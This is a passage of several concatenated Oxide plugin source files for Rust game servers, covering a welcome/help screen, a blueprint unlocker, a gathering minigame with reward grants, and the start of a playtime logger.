                            Text = { FadeIn = 1f, Text = "<color=#14dc6e>✓</color> Показывать каждый раз при входе в игру", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 15, Color = "1 1 1 0.4"}
                        }, Layer, Layer + ".CurrentSwitch");
                    }
                    CuiHelper.AddUi(player, container);
                    break; 
                }*/
                case "read":
                    {
                        if (!args.HasArgs(2)) return;
                        int index = 0;
                        if (!int.TryParse(args.Args[1], out index)) return;

                        var cPage = Configuration.Pages.ElementAtOrDefault(index);
                        if (cPage == null) return;

                        if (player.HasPlayerFlag(BasePlayer.PlayerFlags.Unused2)) return;
                        cPage.Draw(player);
                        break;
                    }
            }
        }

        [ChatCommand("info")]
        private void CmdChatInfo(BasePlayer player, string command, string[] args) => UI_DrawInterface(player, false);

        #endregion

        #region Initialization

        private void OnServerInitialized()
        {
            if (Interface.Oxide.DataFileSystem.ExistsDatafile($"{Name}/Data"))
                PlayerInfos = Interface.Oxide.DataFileSystem.ReadObject<Hash<ulong, PlayerInfo>>($"{Name}/Data");

            BasePlayer.activePlayerList.ToList().ForEach(p =>
            {
                if (!PlayerInfos.ContainsKey(p.userID))
                    PlayerInfos.Add(p.userID, new PlayerInfo());
            });

            timer.Every(60, SaveData);
        }

        private void SaveData()
        {
            Interface.Oxide.DataFileSystem.WriteObject($"{Name}/Data", PlayerInfos);
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                Configuration = Config.ReadObject<Configs>();
                if (Configuration?.InterfaceSettings == null) LoadDefaultConfig();
            }
            catch
            {
                PrintWarning($"Error reading config, creating one new config!");
                LoadDefaultConfig();
            }

            NextTick(SaveConfig);
        }

        protected override void LoadDefaultConfig()
        {
            Configuration = Configs.GetNewConf();
        }

        protected override void SaveConfig() => Config.WriteObject(Configuration);

        private void OnPlayerInit(BasePlayer player)
        {
            if (player.IsReceivingSnapshot)
            {
                NextTick(() => OnPlayerInit(player));
                return;
            }
            if (!PlayerInfos.ContainsKey(player.userID))
                PlayerInfos.Add(player.userID, new PlayerInfo());

            if (Configuration.ShowOnJoin) UI_DrawInterface(player);
        }

        #endregion

        #region Interface

        private void Unload()
        {
            SaveData();
            BasePlayer.activePlayerList.ToList().ForEach(p =>
            {
                CuiHelper.DestroyUi(p, Layer);
            });
        }

        private const string Layer = "UI_LayerInfo";
        private void UI_DrawInterface(BasePlayer player, bool onJoin = true)
        {
            var playerInfo = PlayerInfos[player.userID];

            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, Layer);

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Image = { Color = "0 0 0 0.9" }
            }, "Overlay", Layer);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.895", AnchorMax = "1 1", OffsetMax = "0 0" },
                Text = { Text = Configuration.InterfaceSettings.HeaderText, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 38, FadeIn = 1f, Color = "1 1 1 0.1" }
            }, Layer);


            // Верхний делимитер
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0.895", AnchorMax = "1 0.895", OffsetMin = "0 -1", OffsetMax = "0 0" },
                Image = { Color = "1 1 1 0.2" }
            }, Layer);

            // Текст в делимитере
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.755", AnchorMax = "1 0.895", OffsetMax = "0 0" },
                Text = { Text = Configuration.InterfaceSettings.DelimiterText, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 26, Color = "1 1 1 0.8" }
            }, Layer);

            // Нижний делимитер
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0.755", AnchorMax = "1 0.755", OffsetMin = "0 -1", OffsetMax = "0 0" },
                Image = { Color = "1 1 1 0.2" }
            }, Layer);

            // Левый нижний угол
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "0 0", OffsetMax = "400 100" },
                Text = { Text = Configuration.InterfaceSettings.LeftDownText, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 22, Color = "1 1 1 0.3" }
            }, Layer);

            // Правый нижний угол
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-400 0", OffsetMax = "0 100" },
                Text = { Text = Configuration.InterfaceSettings.RightDownText, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 22, Color = "1 1 1 0.3" }
            }, Layer);

            bool shouldRead = false;
            float topPos = (float)Configuration.Pages.Count / 2 * 50;

            foreach (var check in Configuration.Pages.Select((i, t) => new { A = i, B = t }))
            {
                string helpText = "<color=#DC143C><b>X</b></color> ";
                if (playerInfo.ReadArticles.Contains(check.A.DisplayName) || !check.A.Important) helpText = $"<color=#14dc6e>✓</color>";
                else shouldRead = true;

                topPos -= 50;
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.35 0.45", AnchorMax = "1 0.45", OffsetMin = $"0 {topPos}", OffsetMax = $"0 {topPos + 50}" },
                    Button = { Color = $"0 0 0 {0}", Command = $"UI_WelcomeHelpHandler read {check.B}" },
                    Text = { Text = check.A.DisplayName.ToUpper(), Font = "robotocondensed-regular.ttf", FontSize = 24, Align = TextAnchor.MiddleLeft }
                }, Layer);

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0.45", AnchorMax = "0.345 0.45", OffsetMin = $"0 {topPos}", OffsetMax = $"0 {topPos + 50}" },
                    Button = { Color = $"0 0 0 {0}", Command = $"UI_WelcomeHelpHandler read {check.B}" },
                    Text = { Text = helpText, Font = "robotocondensed-regular.ttf", FontSize = 24, Align = TextAnchor.MiddleRight }
                }, Layer);
            }

            if (!shouldRead && onJoin && Configuration.Pages.Any(p => p.Important)) return;

            if (shouldRead)
            {
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0", OffsetMin = "0 0", OffsetMax = "0 25" },
                    Button = { Color = "0 0 0 0", Material = "", Command = "UI_WelcomeHelpHandler switch" },
                    Text = { Text = "<color=#DC143C><b>X</b></color> Прочитайте обязательные статьи (помечены крестом)", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 15, Color = "1 1 1 0.4" }
                }, Layer, Layer + ".CurrentSwitch");
            }
            else
            {
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.5 0", AnchorMax = "0.5 0", OffsetMin = "-200 25", OffsetMax = "200 75" },
                    Button = { Color = "0.968627453107 0.921568632 0.882352948 0.02529412", Material = "", Close = Layer },
                    Text = { Text = Configuration.InterfaceSettings.ButtonText, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 28 }
                }, Layer);

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0", OffsetMin = "0 0", OffsetMax = "0 25" },
                    Button = { Color = "0 0 0 0", Material = "", Command = "UI_WelcomeHelpHandler switch" },
                    Text = { Text = "<color=#14dc6e>✓</color> Вы успешно прочитали статьи, и можете начать игру", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 15, Color = "1 1 1 0.4" }
                }, Layer, Layer + ".CurrentSwitch");
            }

            CuiHelper.AddUi(player, container);
        }

        #endregion
    }
}

// --- End of file: WelcomeHelp.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/BPUnlockerVip.cs ---
// --- Original Local Path: BPUnlockerVip.cs ---

using Newtonsoft.Json;
using Oxide.Core.Libraries.Covalence;
using ProtoBuf;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
// ReSharper disable UnusedMember.Local

namespace Oxide.Plugins
{
    [Info("Blueprints Unlocker", "Vlad-00003", "1.2.1")]
    [Description("Unlock all blueprints to the players")]
    /*
     * Author info:
     *   E-mail: Vlad-00003@mail.ru
     *   Vk: vk.com/vlad_00003
     */
    class BPUnlockerVip : RustPlugin
    {
        #region Vars
        private PluginConfig _config;
        private readonly List<ItemDefinition> _available = new List<ItemDefinition>();
        private Timer _updater;
        //private static readonly WaitForFixedUpdate WaitForFixedUpdate = new WaitForFixedUpdate();
        private readonly Queue<ulong> _order = new Queue<ulong>();
        private bool _inProgress;
        #endregion

        #region Config
        private class PluginConfig
        {
            [JsonProperty("Permission to automaticly unlock ALL blueprints")]
            public string All = "bpunlockervip.all";
            [JsonProperty("Permission to remove workbench requirements")]
            public string NoWorkbench = "bpunlockervip.noworkbench";
            [JsonProperty("List of cutom permissions")]
            public Dictionary<string, List<string>> CustomPermissions;
            [JsonProperty("List of all available blueprints to unlock(editing does nothing)")]
            public Dictionary<string, List<string>> Available = new Dictionary<string, List<string>>();
            [JsonProperty("Command to unlock/lock blueprints for the player")]
            public string Command = "bp";
            [JsonProperty("Permission to use command")]
            public string CommandPermission = "bpunlockervip.admin";

            [JsonIgnore]
            public readonly Dictionary<string, List<ItemDefinition>> Custom = new Dictionary<string, List<ItemDefinition>>();
        }
        #endregion

        #region Config Initialization
        protected override void LoadDefaultConfig()
        {
            _config = new PluginConfig();
            var bplist = ItemManager.GetBlueprints();
            foreach (var bp in bplist)
            {
                if (bp.userCraftable && !bp.defaultBlueprint)
                {
                    if (!_config.Available.ContainsKey(bp.targetItem.category.ToString("F")))
                    {
                        _config.Available[bp.targetItem.category.ToString("F")] = new List<string>() { bp.targetItem.displayName.english };
                    }
                    else
                    {
                        _config.Available[bp.targetItem.category.ToString("F")].Add(bp.targetItem.displayName.english);
                    }
                }
            }
            _config.CustomPermissions = new Dictionary<string, List<string>>()
            {
                ["bpunlockervip.sniper"] = new List<string>()
                {
                    "HV 5.56 Rifle Ammo",
                    "Bolt Action Rifle",
                    "Large Medkit",
                    "Coffee Can Helmet",
                    "Road Sign Jacket",
                    "Road Sign Kilt"
                },
                ["bpunlockervip.heavy"] = new List<string>()
                {
                    "Heavy Plate Helmet",
                    "Heavy Plate Jacket",
                    "Heavy Plate Pants",
                    "5.56 Rifle Ammo",
                    "Assault Rifle",
                    "Explosive 5.56 Rifle Ammo",
                },
                ["bpunlockervip.builder"] = new List<string>()
                {
                    "Auto Turret",
                    "Concrete Barricade",
                    "Metal Barricade",
                    "Sandbag Barricade",
                    "Bed",
                    "Locker",
                    "Mail Box",
                    "High External Stone Gate",
                    "High External Wooden Gate",
                    "High External Stone Wall",
                    "High External Wooden Wall",
                }
            };
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            _config = Config.ReadObject<PluginConfig>();
            if (_config.NoWorkbench == null)
                _config.NoWorkbench = "bpunlockervip.noworkbench"; //Для совместимости с прошлыми версиями
            permission.RegisterPermission(_config.CommandPermission, this);
            permission.RegisterPermission(_config.All, this);
            permission.RegisterPermission(_config.NoWorkbench, this);
            foreach (var perm in _config.CustomPermissions)
                permission.RegisterPermission(perm.Key, this);
            var itemdefs = ItemManager.GetItemDefinitions();
            foreach (var perm in _config.CustomPermissions)
            {
                foreach (var item in perm.Value)
                {
                    ItemDefinition itemdef = itemdefs.FirstOrDefault(p => p.displayName.english == item || p.shortname == item);
                    if (itemdef == null)
                    {
                        PrintWarning(GetMsg("NoDefFound", null, item, perm.Key));
                        continue;
                    }
                    if (!_config.Custom.ContainsKey(perm.Key))
                    {
                        _config.Custom[perm.Key] = new List<ItemDefinition>() { itemdef };
                    }else
                    {
                        _config.Custom[perm.Key].Add(itemdef);
                    }
                }
            }
        }
        protected override void SaveConfig()
        {
            Config.WriteObject(_config);
        }
        #endregion

        #region Init
        void Init()
        {
            AddCovalenceCommand(_config.Command, "CmdBp", _config.CommandPermission);
            var bplist = ItemManager.GetBlueprints();
            foreach (var bp in bplist)
            {
                if (bp.userCraftable && !bp.defaultBlueprint)
                {
                    _available.Add(bp.targetItem);
                }
            }
        }
        void Unload()
        {
            if (_updater != null && !_updater.Destroyed)
                _updater.Destroy();
        }
        void OnServerInitialized()
        {
            _updater = timer.Every(1f, UpdatePermissions);
        }
        #endregion

        #region Localization
        private string GetMsg(string langline, object userId = null, params object[] args)
        {
            string msg = lang.GetMessage(langline, this, userId?.ToString());
            return string.Format(msg, args);
        }
        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>()
            {
                ["UserUnlocked"] = "Unlocked all blueprints for player \"{0}\"",
                ["UserUnlockedSome"] = "Player \"{0}\" has unlocked blueprints pack \"{1}\"",
                ["UserLocked"] = "Blueprints for player \"{0}\" reseted to default",
                ["Syntax"] = "Wrong syntax! Use /{0} [unlock/lock] [player] [blueprint or custom permissions group or all]",
                ["Syntax1"] = "You forgot to specify what to unlock",
                ["NoPlayer"] = "Player {0} not found on the server!",
                ["NoDefFound"] = "Defenition for item \"{0}\" (permission \"{1}\") not found! Check your config!",
                ["ItemNotFound"] = "Item \"{0}\" not found!",
                ["ItemUnlocked"] = "Blueprint for item \"{0}\" has being unlocked to player \"{1}\"!"
            }, this);
            lang.RegisterMessages(new Dictionary<string, string>()
            {
                ["UserUnlocked"] = "Игроку {0} теперь доступны все чертежи",
                ["UserUnlockedSome"] = "Игроку \"{0}\" разблокирован набор чертежей \"{1}\"",
                ["UserLocked"] = "Чертежи игрока \"{0}\" сброшены до стандартных",
                ["Syntax"] = "Неверный синтаксис! Использвуте /{0} [unlock/lock] [игрок] [чертёж или набор чертежей или all]",
                ["Syntax1"] = "Вы забыли указать что разблокировать",
                ["NoPlayer"] = "Игрок \"{0}\" сейчас не находится на сервере!",
                ["NoDefFound"] = "Предмет \"{0}\" (привилегия \"{1}\") не найден! Проверьте файл конфигурации!",
                ["ItemNotFound"] = "Предмет \"{0}\" не найден!",
                ["ItemUnlocked"] = "Чертёж предмета \"{0}\" разблокирован для игрока \"{1}\"!"
            }, this, "ru");
        }
        #endregion

        #region Oxide hooks
        private void OnPlayerInit(BasePlayer player)
        {
            if (!_order.Contains(player.userID))
                _order.Enqueue(player.userID);
        }
    object CanCraft(PlayerBlueprints bps, ItemDefinition itemDef, int skinId)
        {
            var player = bps.GetComponent<BasePlayer>();
            if (player)
            {
                var reply = 0;
                bool hasperm = permission.UserHasPermission(player.UserIDString, _config.NoWorkbench);
                bool hasSkin = skinId == 0 || bps.steamInventory.HasItem(skinId);
                bool unlock = (bps.HasUnlocked(itemDef) && player.currentCraftLevel >= (double)itemDef.Blueprint.workbenchLevelRequired);
                
                return hasSkin && (unlock || hasperm);
            }
            return null;
        }
        #endregion

        #region Functions
        private void UpdatePermissions()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                if (!_order.Contains(player.userID))
                {
                    _order.Enqueue(player.userID);
                }

                player.ClientRPCPlayer(null, player, "craftMode",
                    permission.UserHasPermission(player.UserIDString, _config.NoWorkbench) ? 1 : 0);

                if (_order.Any() && !_inProgress)
                {
                    _inProgress = true;
                    ServerMgr.Instance.StartCoroutine(Unlock(_order.Dequeue()));
                }
            }
        }
        IEnumerator Unlock(ulong userId, List<ItemDefinition> list = null)
        {
            var player = BasePlayer.FindByID(userId);
            if (player == null || !player.IsConnected)
            {
                _inProgress = false;
                yield break;
            }
            if(list == null)
                list = GetBpist(player);
            if (list.All(player.blueprints.IsUnlocked))
            {
                _inProgress = false;
                yield break;
            }
            PersistantPlayer playerInfo = ServerMgr.Instance.persistance.GetPlayerInfo(player.userID);
            foreach (var def in list)
            {
                if (!playerInfo.unlockedItems.Contains(def.itemid))
                {
                    playerInfo.unlockedItems.Add(def.itemid);
                }
                //yield return WaitForFixedUpdate;
            }
            ServerMgr.Instance.persistance.SetPlayerInfo(player.userID, playerInfo);
            player?.SendNetworkUpdateImmediate();
            player?.ClientRPCPlayer(null, player, "UnlockedBlueprint", 0);
            _inProgress = false;
        }
        #endregion

        #region Commands
        private void CmdBp(IPlayer player, string cmd, string[] args)
        {
            if (args == null || args.Length < 2)
            {
                player.Message(GetMsg("Syntax", player.Id, _config.Command));
                return;
            }
            BasePlayer target = BasePlayer.Find(args[1]);
            if (target == null)
            {
                player.Message(GetMsg("NoPlayer", player.Id, args[1]));
                return;
            }
            switch (args[0].ToLower())
            {
                case "unlock":
                    if(args.Length < 3)
                    {
                        string msg = GetMsg("Syntax", player.Id, _config.Command) + "\n" + GetMsg("Syntax1", player.Id);
                        player.Message(msg);
                        return;
                    }
                    if(args[2].ToLower() == "all")
                    {
                        //target.blueprints.UnlockAll();
                        ServerMgr.Instance.StartCoroutine(Unlock(target.userID,_available));
                        player.Message(GetMsg("UserUnlocked", player.Id, target.displayName));
                        return;
                    }
                    if (_config.Custom.ContainsKey(args[2].ToLower()))
                    {
                        _config.Custom[args[2].ToLower()].ForEach(bp => target.blueprints.Unlock(bp));
                        player.Message(GetMsg("UserUnlockedSome", player.Id, target.displayName, args[2].ToLower()));
                        return;
                    }
                    var def = _available.FirstOrDefault(p => p.displayName.english == args[2] || p.shortname == args[2]);
                    if(def == null)
                    {
                        player.Message(GetMsg("ItemNotFound", player.Id, args[2]));
                        return;
                    }
                    target.blueprints.Unlock(def);
                    player.Message(GetMsg("ItemUnlocked", player.Id, def.displayName.english, target.displayName));
                    return;
                case "lock":
                    target.blueprints.Reset();
                    target.SendNetworkUpdateImmediate();
                    target.ClientRPCPlayer(null, target, "UnlockedBlueprint", 0);
                    player.Message(GetMsg("UserLocked", player.Id, target.displayName));
                    return;
            }
        }
        #endregion

        #region Helpers
        private List<ItemDefinition> GetBpist(object player)
        {
            string userId;
            if (player is BasePlayer)
                userId = ((BasePlayer) player).UserIDString;
            else
                userId = player.ToString();

            if (permission.UserHasPermission(userId, _config.All))
                return _available;
            return _config.Custom.Where(p => permission.UserHasPermission(userId, p.Key))
                .SelectMany(x => x.Value).ToList();
        }
        #endregion

    }
}
////////////////////////////////////////////////////////////////////


// --- End of file: BPUnlockerVip.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/SuperGame.cs ---
// --- Original Local Path: SuperGame.cs ---

﻿using System.Collections.Generic;
using System.Linq;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("SuperGame", "Chibubrik", "1.3.0")]
    class SuperGame : RustPlugin
    {
        #region Вар
        private string Layer = "Game_UI";

        [PluginReference] private Plugin ImageLibrary;
        public Dictionary<ulong, Gather> gather;
        #endregion

        #region Класс
        public class Settings
        {
            [JsonProperty("Название панельки")] public string Name;
            [JsonProperty("Сбрасывать ли прогресс при достижении 200 баллов?")] public bool Progress;
            [JsonProperty("Информация")] public string Info;
            [JsonProperty("Баллы")] public string Ball;
        }

        public class GameSettings
        {
            [JsonProperty("Название руды")] public string Name;
            [JsonProperty("ShortName руды")] public string ShortName;
            [JsonProperty("Сколько нужно набрать очков")] public int Count;
        }

        public class Gather
        {
            [JsonProperty("Общее кол - во баллов")] public int Amount;
            [JsonProperty("Список добываемых ресурсов")] public Dictionary<string, PlayerGather> Res = new Dictionary<string, PlayerGather>();
        }

        public class PlayerGather
        {
            [JsonProperty("Количество очков у игрока")] public int Count;
        }
        #endregion

        #region Конфиг
        public Configuration config;
        public class Configuration
        {
            [JsonProperty("Настройки")] public Settings settings = new Settings();
            [JsonProperty("Ресурсы")] public List<GameSettings> game;
            [JsonProperty("Список наград (выбирается случайно)")] public Dictionary<string, string> RewardList;
            public static Configuration GetNewCong()
            {
                return new Configuration
                {
                    settings = new Settings
                    {
                        Name = "СУПЕРИГРА",
                        Progress = false,
                        Info = "Суперигра в которой ты можешь выиграть случайную привилегию.\nПри добычи Дерева, Камня, Железной и Серной руды, вы будете получать от 1 до 3 баллов.\nСобрав 200 баллов, вы выполните одно задание. Если число получится более 200, выши баллы сгорают и придется начинать сначала. Набрав 800 баллов, нажмите на кнопку забрать, чтобы получить случайную привилегию: Premium, Wars, Elite, King, Grand на 7 дней.",
                        Ball = "Собери все 800 баллов и получи приз!"
                    },
                    game = new List<GameSettings>
                    {
                        new GameSettings
                        {
                            Name = "Дерево",
                            ShortName = "wood",
                            Count = 200
                        },
                        new GameSettings
                        {
                            Name = "Камень",
                            ShortName = "stones",
                            Count = 200
                        },
                        new GameSettings
                        {
                            Name = "Железная руда",
                            ShortName = "metal.ore",
                            Count = 200
                        },
                        new GameSettings
                        {
                            Name = "Серная руда",
                            ShortName = "sulfur.ore",
                            Count = 200
                        }
                    },
                    RewardList = new Dictionary<string, string>
                    {
                        ["o.grant user %STEAMID% king"] = "Кинг на 7 дней",
                        ["o.grant user %STEAMID% HitAdvance.line"] = "HitAdvance на 7 дней"
                    }
                };
            }
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<Configuration>();
                if (config?.RewardList == null) LoadDefaultConfig();
            }
            catch
            {
                PrintWarning($"Ошибка чтения конфигурации 'oxide/config/{Name}', создаём новую конфигурацию!!");
                LoadDefaultConfig();
            }

            NextTick(SaveConfig);
        }

        protected override void LoadDefaultConfig() => config = Configuration.GetNewCong();
        protected override void SaveConfig() => Config.WriteObject(config);
        #endregion

        #region Команды
        [ChatCommand("game")]
        private void cmdGame(BasePlayer player, string command, string[] args)
        {
            GameUI(player);
        }

        [ConsoleCommand("game.priz")]
        private void cmdConsoleGame(ConsoleSystem.Arg args)
        {
            var player = args.Player();
			int sum = config.game.Sum(p => p.Count);
            if (gather[player.userID].Amount >= sum)
            {
                var name = config.RewardList.ToList().GetRandom();
                var item = name.Key.Split('+')[0];
                Server.Command(item.Replace("%STEAMID%", player.UserIDString));
                SendReply(player, $"<color=#7e53d4><size=16>СУПЕРИГРА</size></color>\nВы получили {name.Value}");
                CuiHelper.DestroyUi(player, Layer);
                gather.Clear();
                SaveData();
            }
            else
            {
                SendReply(player, $"<size=16>СУПЕРИГРА</size>\nВы не собрали нужное количество очков!\n У вас {gather[player.userID].Amount} очков");
            }
        }
        #endregion

        #region Хуки
        private void OnServerInitialized()
        {
            if (Interface.Oxide.DataFileSystem.ExistsDatafile("SuperGame/Player"))
            {
                gather = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, Gather>>("SuperGame/Player");
            }
            else
            {
                gather = new Dictionary<ulong, Gather>();
            }

            foreach (var player in BasePlayer.activePlayerList)
                OnPlayerConnected(player);
        }

        private PlayerGather GatherData(ulong userID, string name)
        {
            if (!gather.ContainsKey(userID)){
                gather.Add(userID, new Gather());
				gather[userID].Res = new Dictionary<string, PlayerGather>();
			}

            if (!gather[userID].Res.ContainsKey(name))
                gather[userID].Res[name] = new PlayerGather();

            return gather[userID].Res[name];
        }

        private void OnPlayerConnected(BasePlayer player)
        {
            if (!gather.ContainsKey(player.userID))
            {
                gather.Add(player.userID, new Gather());
            }
        }

        private void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, Layer);
            }
            SaveData();
        }

        private void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            SaveData();
        }

        private void SaveData()
        {
            Interface.Oxide.DataFileSystem.WriteObject("SuperGame/Player", gather);
        }

        private void OnDispenserBonus(ResourceDispenser dispenser, BasePlayer player, Item item)
        {
			if (item==null || player==null) return;
            var check = config.game.FirstOrDefault(x => x.ShortName == item.info.shortname);
            if (check == null) return;
            
			if (check.ShortName != item.info.shortname) return;
			
			PlayerGather data = GatherData(player.userID, check.ShortName);
			int amount = UnityEngine.Random.Range(1, 3);
			data.Count += amount;
			gather[player.userID].Amount += amount;			
			if (config.settings.Progress)
			{
				
				if (data.Count > check.Count)
				{
					gather[player.userID].Amount -= data.Count;
					data.Count = 0;
					SendReply(player, "<color=#7e53d4><size=16>СУПЕРИГРА</size></color>\nВы перефармили, <color=#7e53d4>прогресс</color> сброшен!");
				}
			}
			
        }
        #endregion

        #region Интерфейс
        private void GameUI(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, Layer);
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Image = { Color = "0 0 0 0.9" },
            }, "Overlay", Layer);

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "-2 -2", AnchorMax = "2 2", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0.9", Close = Layer },
                Text = { Text = "" }
            }, Layer);

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.3 0.27", AnchorMax = "0.7 0.73", OffsetMax = "0 0" },
                Button = { Color = "1 1 1 0.1" },
                Text = { Text = "" }
            }, Layer, "Game");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0.86", AnchorMax = "1 1", OffsetMax = "0 0" },
                Button = { Color = "1 1 1 0.1" },
                Text = { Text = config.settings.Name, Color = "1 1 1 0.5", Align = TextAnchor.MiddleCenter, FontSize = 30, Font = "robotocondensed-bold.ttf", FadeIn = 0.5f }
            }, "Game");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.01 0.15", AnchorMax = "0.99 0.5", OffsetMax = "0 0" },
                Button = { Color = "1 1 1 0.1" },
                Text = { Text = config.settings.Info, Color = "1 1 1 0.5", Align = TextAnchor.MiddleCenter, FontSize = 12, Font = "robotocondensed-regular.ttf", FadeIn = 0.5f }
            }, "Game");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.14", OffsetMax = "0 0" },
                Button = { Color = "1 1 1 0.1" },
                Text = { Text = config.settings.Ball, Color = "1 1 1 0.5", Align = TextAnchor.MiddleCenter, FontSize = 14, Font = "robotocondensed-bold.ttf", FadeIn = 0.5f }
            }, "Game", "Give");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.8 0.1", AnchorMax = "0.99 0.9", OffsetMax = "0 0" },
                Button = { Color = "1 1 1 0.1", Command = $"game.priz" },
                Text = { Text = $"ЗАБРАТЬ", Color = "1 1 1 0.5", Align = TextAnchor.MiddleCenter, FontSize = 14, Font = "robotocondensed-bold.ttf", FadeIn = 0.5f }
            }, "Give");

            float width = 0.2485f, height = 0.32f, xmin = 0.002f, ymin = 0.84f - height;
            foreach (var check in config.game)
            {
                var data = GatherData(player.userID, check.ShortName);

                container.Add(new CuiPanel
                {
                    RectTransform = { AnchorMin = xmin + " " + ymin, AnchorMax = (xmin + width) + " " + (ymin + height * 1), OffsetMin = "4 0", OffsetMax = "-4 0" },
                    Image = { Color = "0 0 0 0" }
                }, "Game", "Items");
                xmin += width;

                container.Add(new CuiElement
                {
                    Parent = "Items",
                    Components =
                    {
                        new CuiRawImageComponent { Png = (string) ImageLibrary.Call("GetImage", check.ShortName) },
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "5 5", OffsetMax = "-5 -5" }
                    }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = $"1 1", OffsetMax = "0 0" },
                    Button = { Color = "1 1 1 0.1" },
                    Text = { Text = $"{data.Count / 2}%", Color = "1 1 1 0.6", Align = TextAnchor.MiddleCenter, FontSize = 40, Font = "robotocondensed-bold.ttf" }
                }, "Items");

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = $"1 1", OffsetMax = "0 0" },
                    Button = { Color = "0 0 0 0" },
                    Text = { Text = $"{check.Name}", Color = "1 1 1 0.5", Align = TextAnchor.LowerCenter, FontSize = 12, Font = "robotocondensed-regular.ttf" }
                }, "Items");
            }

            CuiHelper.AddUi(player, container);
        }
        #endregion
    }
}

// --- End of file: SuperGame.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/PlayTime.cs ---
// --- Original Local Path: PlayTime.cs ---

/******************************************************************************
* Version 2.0 Changelog
*** Rewrote and cleaned up the plugin.*
*** Changed the method of logging time to log time every x minutes.*
*** Cleaned up the playtime command output.*
*** Cleaned up the lastseen command output.*
*** Cleaned up the mostonline command output.*
*** Added a message on login that says how long since the player last logged in.*
*** Fixed KeyNotFoundException when running lastseen on a user that doesn't exist.*
*** Added a prefix to all chat commands. "Play Time"*
*** Added BroadcastLastSeenOnConnect to config, so the broadcast can be disabled if need be.
*** Config will update with new values automatically in future updates.
******************************************************************************/

using System.Collections.Generic;
using System;
using System.Linq;
using Oxide.Core;

namespace Oxide.Plugins
{
    [Info("PlayTime", "Waizujin", 2.0)]
    [Description("Logs players play time and allows you to view the players play time with a command.")]
    public class PlayTime : RustPlugin
    {
		public string Prefix = "<color=red>Play Time:</color> ";
		public int SaveInterval { get { return Config.Get<int>("Save Interval"); } }
		public bool BroadcastLastSeenOnConnect { get { return Config.Get<bool>("Broadcast Last Seen on Connect"); } }

		protected override void LoadDefaultConfig()
		{
			PrintWarning("Creating a new configuration file.");

			Config["Save Interval"] = 300;
			Config["Broadcast Last Seen on Connect"] = true;
		}

		class PlayTimeData
        {
            public Dictionary<string, PlayTimeInfo> Players = new Dictionary<string, PlayTimeInfo>();

            public PlayTimeData() {  }
        }

        class PlayTimeInfo
        {
            public string SteamID;
            public string Name;
            public long LastPlayTimeIncrement;
            public long LastLogoutTime;
            public long PlayTime;

            public PlayTimeInfo() {  }

            public PlayTimeInfo(BasePlayer player)
            {
                long currentTimestamp = GrabCurrentTimestamp();
                SteamID = player.userID.ToString();
                Name = player.displayName;
                LastPlayTimeIncrement = currentTimestamp;
                LastLogoutTime = 0;
                PlayTime = 0;
            }
        }

        PlayTimeData playTimeData;

        private void OnServerInitialized()
        {
			var dirty = false;

			if (Config["Save Interval"] == null)
			{
				Config["Save Interval"] = 300;
